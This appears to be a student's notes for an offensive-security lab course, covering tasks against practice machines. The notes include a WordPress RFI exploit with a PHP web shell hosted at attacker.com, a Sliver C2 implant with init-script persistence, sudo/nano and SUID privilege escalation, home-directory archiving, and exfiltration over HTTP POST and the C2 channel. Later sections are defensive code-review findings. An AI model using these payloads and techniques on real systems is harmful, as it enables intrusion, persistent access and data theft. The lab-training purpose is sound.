

# Task 2?

![[Tasks-20251126224118471.webp]]


```
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
kali@kali 2025-11-26 18:44:56 ~> cd Desktop/
kali@kali 2025-11-26 18:53:36 ~/Desktop> sudo docker load --input exercise_two.tar 
[sudo] password for kali: 
767e56ba346a: Loading layer [==================================================>]  80.42MB/80.42MB
304f91fb83bd: Loading layer [==================================================>]  267.7MB/267.7MB
b18ea8d956cf: Loading layer [==================================================>]  2.048kB/2.048kB
b40b3663cd38: Loading layer [==================================================>]  350.7kB/350.7kB
1a1622980f14: Loading layer [==================================================>]  6.144kB/6.144kB
780730748384: Loading layer [==================================================>]  4.096kB/4.096kB
595c6f5efa27: Loading layer [==================================================>]  46.59kB/46.59kB
857f330bb1bd: Loading layer [==================================================>]  2.048kB/2.048kB
Loaded image: exercise_two:latest
kali@kali 2025-11-26 18:54:00 ~/Desktop> sudo docker run -p 2222:22 exercise_two:latest
```



![[Tasks-20251126220402646.webp]]






```

masar@2cb4f80af4b5:~$ sudo -l
Matching Defaults entries for masar on 2cb4f80af4b5:                                                                                                                                                                                         
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                                                                               
                                                                                                                                                                                                                                             
User masar may run the following commands on 2cb4f80af4b5:                                                                                                                                                                                   
    (root) NOPASSWD: /usr/bin/chmod [0-7][0-7][0-7] /*.txt                                                                                                                                                                                   
masar@2cb4f80af4b5:~$ find / -type f -name ".*.txt" 2>/dev/null                                                                                                                                                                              
/usr/local/sbin/.secret_recipe.txt
masar@2cb4f80af4b5:~$ sudo /usr/bin/chmod 777 /usr/local/sbin/.secret_recipe.txt
masar@2cb4f80af4b5:~$ cat /usr/local/sbin/.secret_recipe.txt
This is a top-secret family recipe. The key to the texture and flavor                                                                                                                                                                        
is the secret ingredient: soya. Use it sparingly and always mix well.                                                                                                                                                                        
Keep this recipe safe — only trusted chefs should know it.                                                                                                                                                                                   
masar@2cb4f80af4b5:~$ validate                                                                                                                                                                                                               
validate: ��                                                                                                                                                                                                                                 
            �b���4��ۼ��abnormal behavior!                                                                                                                                                                                                    
masar@2cb4f80af4b5:~$ validate soya                                                                                                                                                                                                          
validate: ��                                                                                                                                                                                                                                 
            �b���4��ۼ��abnormal behavior!                                                                                                                                                                                                    
masar@2cb4f80af4b5:~$ validate -h
validate: ��                                                                                                                                                                                                                                 
            �b���4��ۼ��abnormal behavior!                                                                                                                                                                                                    
```







![[Tasks-20251126224113693.webp]]



----


# Task 3

![[Tasks-20251126224823521.webp]]



```
kali@kali 2025-11-26 20:01:40 ~> nano move_pdf.sh
kali@kali 2025-11-26 20:01:48 ~> cat move_pdf.sh
#!/bin/bash

DOWNLOADS="$HOME/Downloads"
ARCHIVE="$HOME/archive"

mkdir -p "$ARCHIVE"

for file in "$DOWNLOADS"/*.pdf; do
    [ -e "$file" ] || continue
    mv "$file" "$ARCHIVE"/
done
kali@kali 2025-11-26 20:01:50 ~> sudo vim /etc/systemd/system/move_pdf.service
kali@kali 2025-11-26 20:02:07 ~> cat /etc/systemd/system/move_pdf.service
[Unit]
Description=Move PDF files from Downloads into archive

[Service]
Type=oneshot
ExecStart=/usr/local/bin/move_pdf.sh
User=kali

kali@kali 2025-11-26 20:02:10 ~> sudo nano /etc/systemd/system/move_pdf.timer
kali@kali 2025-11-26 20:02:16 ~> cat /etc/systemd/system/move_pdf.timer
[Unit]
Description=Run move_pdf service every 2 minutes

[Timer]
OnUnitActiveSec=120
Unit=move_pdf.service

[Install]
WantedBy=timers.target
kali@kali 2025-11-26 20:02:19 ~> mkdir archive
kali@kali 2025-11-26 20:02:28 ~> sudo systemctl daemon-reload
                                 sudo systemctl enable --now move_pdf.timer
Created symlink '/etc/systemd/system/timers.target.wants/move_pdf.timer' → '/etc/systemd/system/move_pdf.timer'.
kali@kali 2025-11-26 20:02:35 ~> systemctl list-timers | grep move_pdf
-                                  - -                                      - move_pdf.timer               move_pdf.service

```

![[Tasks-20251126230254275.webp]]




---


# Task 4

Download the .vmdk virtual machine file, then import it on your VMWare HyperVisor

Scan the virtual Machine and identify open ports using nmap (optional) and list them down.


```
Nmap scan report for 192.168.0.231
Host is up (0.32s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
135/tcp  open  msrpc           Microsoft Windows RPC
139/tcp  open  netbios-ssn     Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5357/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
7070/tcp open  ssl/realserver?
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2023-12-14T11:16:39
|_Not valid after:  2073-12-01T11:16:39
MAC Address: F4:C8:8A:9A:6E:F6 (Intel Corporate)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```






---


# task 5

- Search for public exploits available on vulnerable applications hosted on http://machineip/under "old applications"

CVE-2007-2426 for wordpress will be used.

A Remote File Inclusion (RFI) vulnerability was identified in the myGallery plugin for WordPress, specifically in the myfunctions/mygallerybrowser.php file. The plugin fails to properly validate user-supplied input to the myPath parameter before using it in a PHP include() call. This allows an attacker to include and execute remote PHP code in the context of the vulnerable web application.


```
/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php
```


Where `shell.txt` is a remote PHP file (e.g., `<?php system($_GET['cmd']); ?>`) hosted by the attacker. Successful exploitation enables remote code execution on the target server, potentially leading to full compromise.

A simple PHP shell was hosted at `http://attacker.com/shell.txt` containing:

```
<?php system($_GET['cmd']); ?>
```

a request was executed as 

```
http://192.168.0.55/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=http://192.168.0.100:9000/shell.txt?&cmd=ls
```

![[Tasks-20251129033609752.webp]]

![[Tasks-20251129033623358.webp]]


successfully returned the output of the `id` command, confirming arbitrary code execution on the underlying system.


### Impact

- **Confidentiality:** Attackers may obtain sensitive data or credentials.
- **Integrity:** Attackers can alter, deface, or delete web content or files.
- **Availability:** Attackers may disrupt service or use the server for further attacks (e.g., pivoting or malware hosting).

### Recommendations

- **Immediate:** Disable or remove the myGallery plugin if present, especially outdated versions.
- **Long-term:** Update to a non-vulnerable version once/if available, or use an alternative supported gallery plugin.
- **General:** Implement input validation and restrict use of dynamic includes in PHP (e.g., never including user-exposed variables in file paths without strict validation).











----


# Task 6

You'r asigned by bazaarjo's CTO to perform a vulnerability scan on the external bazaarjo's network to minimize the attack surface for threat actors, you're required to:

- Node one
	- Ubuntu
- Node two
	- Ubuntu
- Note 3
	- windows


Setup and install nessus



---

# task 7


- search for public exploits available on vulnerable applications hosted on http://machineip/ under "Old (Vulnerable) versions of real applications"
- choose your target web application and search online for public exploits on the identified web application version
- exploit the vulnerability
- write a comprehensive PDF report demonstration the web app and vulnerability you exploited and a link of the exploit you have used supported with screenshots


---

# Task 8

exercise 8

You're assigned to perform a small assessment on bazaarjo's system that you can download from here:

username: user
password: password312


- task 1:
	- threat intelligence team has suspected that the attacker has used a file transfer technique throughout the breach 
	- reproduce the technique using
		- NC
		- SCP
		- HTTP
		- Base64
- task2 :
	- Download, transfer and run linpeas.sh to the target server
	- explore the results
	- exploit the kernel version and check for vulnerabilities 
	- exploit the kernel vulnerability
	- write and document the steps you followed, vulnerability you found and the steps of exploitation
		- with screenshots


## TASK 8.1
### NC

![[Tasks-20251127000757711.webp]]


```
kali@kali 2025-11-26 21:15:29 ~> nc -lvp 4444 > test.txt
listening on [any] 4444 ...
192.168.0.73: inverse host lookup failed: Unknown host
connect to [192.168.0.100] from (UNKNOWN) [192.168.0.73] 55035
```


![[Tasks-20251127001612857.webp]]


![[Tasks-20251127001600327.webp]]



### SCP


![[Tasks-20251127002135204.webp]]



```python
kali@kali 2025-11-26 21:19:39 ~> scp user@192.168.0.76:/home/user/ssh.txt ssh.txt
ssh: connect to host 192.168.0.76 port 22: No route to host
scp: Connection closed
kali@kali 2025-11-26 21:20:33 ~> scp user@192.168.0.73:/home/user/ssh.txt ssh.txt
Unable to negotiate with 192.168.0.73 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
scp: Connection closed
kali@kali 2025-11-26 21:20:45 ~> scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa user@192.168.0.73:/home/user/ssh.txt ssh.txt
The authenticity of host '192.168.0.73 (192.168.0.73)' can't be established.
RSA key fingerprint is SHA256:JwwPVfqC+8LPQda0B9wFLZzXCXcoAho6s8wYGjktAnk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.73' (RSA) to the list of known hosts.
user@192.168.0.73's password: 
ssh.txt                                                                                                                                                                                                    100%    5     1.8KB/s   00:00    
kali@kali 2025-11-26 21:21:12 ~> cat ssh
cat: ssh: No such file or directory
kali@kali 2025-11-26 21:21:14 ~> cat ssh.txt 
test
```

This ssh verison was used because the linux's ssh version is **extremely** old


### HTTP

for HTTP were sending a file over now


```python
kali@kali 2025-11-26 21:24:39 ~> touch HTTP.txt | echo 'HTTP' > HTTP.txt
kali@kali 2025-11-26 21:25:04 ~> python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...

```


On the victims side



![[Tasks-20251127002715785.webp|853]]


```
kali@kali 2025-11-26 21:24:39 ~> touch HTTP.txt | echo 'HTTP' > HTTP.txt
kali@kali 2025-11-26 21:25:04 ~> python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
i192.168.0.73 - - [26/Nov/2025 21:27:04] "GET /HTTP.txt HTTP/1.0" 200 -
```

### BASE64

![[Tasks-20251127003216022.webp]]


```
kali@kali 2025-11-26 21:31:50 ~> echo "aGVsbG8gaW0gZW5jcnlwdGVkCg==" > base64.file
kali@kali 2025-11-26 21:31:57 ~> base64 -d base64.file 
hello im encrypted
```



## TASK 8.2




```
kali@kali 2025-11-26 21:32:49 ~> scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa linpeas.sh  user@192.168.0.73:/home/user/linpeas.sh 
user@192.168.0.73's password: 
linpeas.sh                                                                                                                                                                                                 100%  932KB  20.8MB/s   00:00    
kali@kali 2025-11-26 21:33:16 ~> ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa user@192.168.0.73
user@192.168.0.73's password: 
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Nov 26 19:31:16 2025 from 192.168.0.100
user@debian:~$ ls
base64.file  base64.txt  HTTP.txt  linpeas.sh  ssh.txt  test.txt
user@debian:~$ ./linpeas.sh 
```





![[Tasks-20251127003354539.webp]]


![[Tasks-20251127003428327.webp]]


So now lets do `uname -a` to check the versions.

![[Tasks-20251127004349340.webp]]



---

# Task 9

Bazaarjo's management team have analyzed the CTI report of the APT that applied the attack, the threat intelligence team have found the steps used by the APT demonstrated in the below table

You are required to use Sliver C2 to demonstrate and simulate the following attack paths and TTPs in the below table against the target machine, you can download the target machine here





## Priv Esc


Generating a shell first 


```
sliver > generate --os linux --arch amd64 --format elf --name mybeacon1 --mtls 192.168.0.100

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 17s
[*] Implant saved to /home/kali/mybeacon1

[*] Session 6aa35909 mybeacon1 - 192.168.0.73:43407 (debian) - linux/amd64 - Thu, 27 Nov 2025 09:34:07 UTC
```



```
sliver (mybeacon1) > shell

? This action is bad OPSEC, are you an adult? Yes

[*] Wait approximately 10 seconds after exit, and press <enter> to continue
[*] Opening shell tunnel (EOF to exit) ...

[*] Started remote shell with pid 2453
```



```
user@debian:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
/usr/sbin/exim-4.84-3
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/bin/ping6
/bin/ping
/bin/mount
/bin/su
/bin/umount
/sbin/mount.nfs
```

The NMAP binary is suspicious and so is the suid-so binaries, when we run it we immediately simply get root!.

```
user@debian:/tmp$ /usr/local/bin/suid-env
root@debian:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/tmp# cat /usr/local/bin/suid-env
ELF>@@
@@@@@@@@@@tt xx`x`( `@@DDPtd@@$$Qt/lib64/ld-linux-x86-64.so.2GNUGNUϾ5q;Xq/ty] 5.$__gmon_start__libc.so.6setresgidsetresuidsystem__libc_start_mainGLIBC_2.2.5ui  G@      ``      `h      `p      `x      `%5 % @% h% h% h% h1I^HHPTI@H@H@Hi HtÐUHS= uK`H H`HHH9s$fDHHe ň`HW H9rC [fff.UH=/ HtH`UH@fffff.Hl$Ld$H- L%| Ll$Lt$L|$H\$H8L)AIHIHt1@LLDAHH9rH\Hl$Ld$Ll$ Lt$(L|$0H8ÐUHSH Htx`DHHu[?service apache2 start <\
                                                                                                                                                                     tzRx
<$TQ_@F                                                                                                                                                                 LAC
@`@o@@@@@
S
 H      ``@@    o@oo@`f@v@@@GCC: (Debian 4.4.5-8) 4.4.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.text.fini.rodata.eh_frame_hdr.eh_frame.ctors.dtors.jcr.dynamic.got.got.plt.data.bss.comment#@ 1<@<$H`@`DoN
                                                          V@@@S^o@
8@8P@PP@@@$@x@` `@   H  `H      `       `      0                pH/o@z@`+@@<@`@@@@@     @
@
 @
` @@@@@x`!@1@8 G [@a@   `       ``@     `x`*`8`E`[      ` @L%   x`@`p@`p@H      `t`t`
                                                             8@call_gmon_startcrtstuff.c__CTOR_LIST____DTOR_LIST____JCR_LIST____do_global_dtors_auxcompleted.6341dtor_idx.6343frame_dummy__CTOR_END____FRAME_END____JCR_END____do_global_ctors_auxsuid-shellshock.c_GLOBAL_OFFSET_TABLE___init_array_end__init_array_start_DYNAMICdata_start__libc_csu_fini_start__gmon_start___Jv_RegisterClasses_fini__libc_start_main@@GLIBC_2.2.5system@@GLIBC_2.2.5setresuid@@GLIBC_2.2.5_IO_stdin_used__data_start__dso_handle__DTOR_END____libc_csu_initsetresgid@@GLIBC_2.2.5__bss_start_end_edatamain_initroot@debian:/tmp# 
root@debian:/tmp# strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start


```



### SUDO abuse with nano



```
user@debian:/tmp$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

```

Now with this we know that we can abuse, lets look it up on GTFOBins

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- ```
    sudo nano
    ^R^X
    reset; sh 1>&0 2>&0
    ```

Now lets run this!!


![[Tasks-20251127161433823.webp]]

![[Tasks-20251127174332109.webp]]

![[Tasks-20251127174453109.webp]]


It looks bugged because of the TTY as the text is coming out sideways

![[Tasks-20251127174655585.webp]]


### Persistence


```
root@debian:/home/user# ls
mybeacon1
root@debian:/home/user# cat /etc/systemd/system/mybeacon.service
[Unit]
Description=Persistent Sliver Beacon

[Service]
ExecStart=/home/user/mybeacon1
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target

root@debian:/home/user# sudo systemctl daemon-reload
sudo: systemctl: command not found
root@debian:/home/user# systemctl
bash: systemctl: command not found
root@debian:/home/user# ps -p 1 -o comm=
init

```


Its a sysvint system hence we need to change the method of persistence here.

![[Tasks-20251127175133398.webp]]

```
root@debian:/home/user# cat chmod +x /etc/init.d/mybeacon
cat: chmod: No such file or directory
cat: +x: No such file or directory
#!/bin/sh
### BEGIN INIT INFO
# Provides:          mybeacon
# Required-Start:    $network
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: Persistent Sliver Beacon
### END INIT INFO

case "$1" in
  start)
    /home/user/mybeacon1 &
    ;;
  stop)
    killall mybeacon1
    ;;
  *)
    echo "Usage: /etc/init.d/mybeacon {start|stop}"
    exit 1
    ;;
esac

root@debian:/home/user# update-rc.d mybeacon defaults
update-rc.d: using dependency based boot sequencing
update-rc.d: warning: mybeacon stop runlevel arguments (0 1 6) do not match LSB Default-Stop values (none)
root@debian:/home/user# /etc/init.d/mybeacon start
[*] Session 01efd10e mybeacon1 - 192.168.0.73:43409 (debian) - linux/amd64 - Thu, 27 Nov 2025 14:52:15 UTC

sliver (mybeacon1) > 


```

as we can see when we started it immediately we got another shell back confirming that it works




### Linux scripting

```
root@debian:/tmp# chmod +x run_beacon.sh
chmod: cannot access `run_beacon.sh': No such file or directory
root@debian:/tmp# chmod +x beacon.sh
root@debian:/tmp# cat beacon.sh 
#!/bin/bash

# Path to beacon
BEACON="/home/user/mybeacon1"

# Execute in background
"$BEACON" &

root@debian:/tmp# chmod +x beacon.sh
root@debian:/tmp# ./beacon.sh 
[*] Session 76cf075c mybeacon1 - 192.168.0.73:43410 (debian) - linux/amd64 - Thu, 27 Nov 2025 15:14:17 UTC

sliver (mybeacon1) > 
```



![[Tasks-20251127181434738.webp]]


### Collection / packaging



![[Tasks-20251127180747964.webp]]

```
root@debian:/tmp# ls
archive.sh  service  tmp.dczKO6Shvy
root@debian:/tmp# chmod +x archive.sh 
root@debian:/tmp# ./archive.sh 
tar: Removing leading `/' from member names
[+] Archive created at: /tmp/home_backup_20251127_130759.tar.gz
root@debian:/tmp# ls
archive.sh  home_backup_20251127_130759.tar.gz  service  tmp.dczKO6Shvy
```


![[Tasks-20251127180812751.webp]]



## Exfiltration


![[Tasks-20251127185111944.webp]]

```
kali@kali 2025-11-27 15:49:24 ~> python upload.py 
192.168.0.73 - - [27/Nov/2025 15:49:32] "POST / HTTP/1.1" 200 -
```

**NOTE IMPORTANT:**

I had to write a python script that allows receiving files

```
kali@kali 2025-11-27 15:51:20 ~> cat upload.py 
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open("exfil.bin", "wb") as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
server = HTTPServer(("0.0.0.0", 8080), Handler)
server.serve_forever()

```


## Exfiltration via C2  Channel

```
sliver (mybeacon1) > ls

/tmp (5 items, 5.0 MiB)
=======================
-rwxr-xr-x  root:root  archive.sh                          232 B    Thu Nov 27 13:07:51 -0500 2025
-rwxr-xr-x  root:root  beacon.sh                           98 B     Thu Nov 27 13:13:58 -0500 2025
-rw-r--r--  root:root  home_backup_20251127_130759.tar.gz  5.0 MiB  Thu Nov 27 13:08:00 -0500 2025
-rwxr-xr-x  user:user  service                             25 B     Thu Nov 27 11:02:38 -0500 2025
-rw-------  user:user  tmp.dczKO6Shvy                      22 B     Thu Nov 27 07:37:17 -0500 2025


sliver (mybeacon1) > download home_backup_20251127_130759.tar.gz

[*] Wrote 5239032 bytes (1 file successfully, 0 files unsuccessfully) to /home/kali/home_backup_20251127_130759.tar.gz
```


![[Tasks-20251127181753052.webp]]


















----


## Task 10


You have received the source code for the data request API component form from the bazaarjo's  developed feature in exercise 10. Your task is to perform a manual review of the provided source code to identify atleast 4 specific, exploitable vulnerabilities before the feature is deployed 

**deliverable**:
for each vulnerability you find, document it in your report using the following format, for vulnerabilities that you believe they fall under certain OWASP category, list the category, else type "N/A"


|#|Vulnerability Description|Code Snippet (Line/Function)|Proposed Mitigation|OWASP Mapping (Category)|
|---|---|---|---|---|
|1|**Sensitive Data Exposure in API Response** - OTP is returned in the response with `DEBUG_OTP` field, allowing attackers to bypass OTP verification|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 43-44:<br>`"DEBUG_OTP": new_otp`|Remove the `DEBUG_OTP` field from production code. OTPs should only be sent via secure channels (email/SMS), never in API responses.|**A01:2021 - Broken Access Control**|
|2|**Missing OTP Expiration Validation** - OTPs are stored with timestamps but never checked for expiration. The `OTP_VALID_MINUTES = 9999` is only a display value, not enforced|[data_generation_service.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 18-20:<br>`stored_otps = OTPTokenDB.get_otps(identity)`<br>No timestamp validation performed|Implement time-based validation: check if `current_time - otp_timestamp <= VALID_DURATION` before accepting OTP. Set reasonable expiration (e.g., 5-10 minutes).|**A07:2021 - Identification and Authentication Failures**|
|3|**OTP Reuse Vulnerability** - Multiple OTPs can be generated and all remain valid simultaneously. No invalidation of old OTPs when new ones are requested|[utilities.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 35-42:<br>[OTPTokenDB.add_otp()](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) - appends to list without clearing previous OTPs|When generating a new OTP, invalidate all previous OTPs for that identity. Only one active OTP should exist per identity at any time.|**A07:2021 - Identification and Authentication Failures**|
|4|**Predictable OTP Generation** - Uses [random.randint()](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) which is not cryptographically secure|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), line 22:<br>`new_otp = str(random.randint(100000, 999999))`|Use `secrets` module instead: `secrets.randbelow(900000) + 100000` or `secrets.token_urlsafe()` for cryptographically secure random generation.|**A02:2021 - Cryptographic Failures**|
|5|**No Rate Limiting Implementation** - `MAX_REQUESTS_PER_HOUR = 9999` is defined but never enforced, allowing unlimited OTP requests (brute force/DoS)|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), line 9:<br>`MAX_REQUESTS_PER_HOUR = 9999` (unused)|Implement rate limiting middleware (e.g., Flask-Limiter) to restrict requests per IP/identity. Limit to 3-5 OTP requests per hour per identity.|**A07:2021 - Identification and Authentication Failures**|
|6|**Insecure Direct Object Reference (IDOR)** - No verification that the requester owns the identity. Anyone who knows an email/phone can request OTPs and data|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 14-18:<br>`handle_otp_request()` - accepts any identity without ownership verification|Implement additional verification steps: send confirmation link to identity before OTP generation, require account-specific secrets, or use challenge-response mechanisms.|**A01:2021 - Broken Access Control**|
|7|**Missing Import Statement** - [os](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) module is used but not imported, causing runtime error|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 47-48:<br>[os.makedirs(...)](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html)|Add [import os](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) at the top of the file with other imports.|**N/A** (Code Quality Issue)|
|8|**Insecure Data Storage** - Sensitive data (OTPs, user mappings) stored in plaintext JSON file without encryption|[utilities.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 11-23:<br>`load_data()` and `save_data()` functions using JSON|Encrypt sensitive data at rest using encryption libraries (e.g., `cryptography`). Use proper database with encryption support. Hash OTPs before storage.|**A02:2021 - Cryptographic Failures**|
|9|**Public S3 File Access** - Generated PDFs are accessible via public URLs without authentication or time-limited access|[data_generation_service.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 45-49 & [utilities.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 71-82:<br>[S3Service.upload()](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) returns public URL|Use pre-signed URLs with short expiration (e.g., 1 hour). Implement access control on S3 bucket. Require authentication to download files.|**A01:2021 - Broken Access Control**|
|10|**Information Disclosure in Error Messages** - Detailed error messages reveal system information (e.g., "Identity not found in deleted users records")|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), line 19:<br>`"Identity not found in deleted users records."`|Use generic error messages like "Invalid request" to avoid leaking information about which identities exist in the system.|**A05:2021 - Security Misconfiguration**|
|11|**Weak OTP Length** - 6-digit OTPs provide only 1 million combinations, susceptible to brute force|`data_request_api.py`, line 22:<br>`random.randint(100000, 999999)`|Increase OTP length to 8+ digits or use alphanumeric codes. Implement account lockout after multiple failed attempts.|**A07:2021 - Identification and Authentication Failures**|
|12|**No HTTPS Enforcement** - Flask app runs without TLS/SSL, exposing sensitive data in transit|`data_request_api.py`, line 52:<br>`app.run(port=5000)`|Run app behind reverse proxy (nginx/Apache) with TLS certificates, or use `app.run(ssl_context='adhoc')` for development. Enforce HTTPS in production.|**A02:2021 - Cryptographic Failures**|
|13|**Debug Mode Potential** - No explicit debug mode disabled, Flask defaults may expose sensitive information|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) & [data_generation_service.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html):<br>[app.run()](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) without `debug=False`|Explicitly set [app.run(debug=False)](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) and configure proper error handlers that don't expose stack traces in production.|**A05:2021 - Security Misconfiguration**|
|14|**No Input Validation/Sanitization** - Identity and period parameters are not validated for format or content|[data_request_api.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html), lines 14-15:<br>`identity = request_data.get('identity')`<br>`period = request_data.get('period')`|Validate identity format (email regex, phone number format). Whitelist allowed period values. Sanitize inputs to prevent injection attacks.|**A03:2021 - Injection**|
|15|**Session/Request Context Not Validated** - No CSRF protection or request origin verification|Both Flask apps - missing CSRF tokens|Implement CSRF protection (Flask-WTF), validate request origins, use proper session management with secure cookies.|**A01:2021 - Broken Access Control**|


---


# Task 12


You are assigned to perform a security assessment for bazaarjo.

Your task is to identify three security vulnerabilities in the website and document them.

## XSS


The application accepts user input in the product description field and stores it directly in [data.json](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) without any sanitization or encoding. When the products page is rendered, the Jinja2 template uses the `| safe` filter which explicitly disables HTML escaping, causing any stored JavaScript or HTML to execute in victims' browsers.

**Vulnerable Code Flow:**

1. **Input:** User submits product description via `/products/add` form
2. **Storage:** Line 94 in [app.py](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) stores raw input: `description = request.form.get('description','')`
3. **Output:** Line 22 in [products.html](vscode-file://vscode-app/c:/Users/USER/AppData/Local/Programs/Microsoft%20VS%20Code/resources/app/out/vs/code/electron-browser/workbench/workbench.html) renders without escaping: `{{ p.description | safe }}`


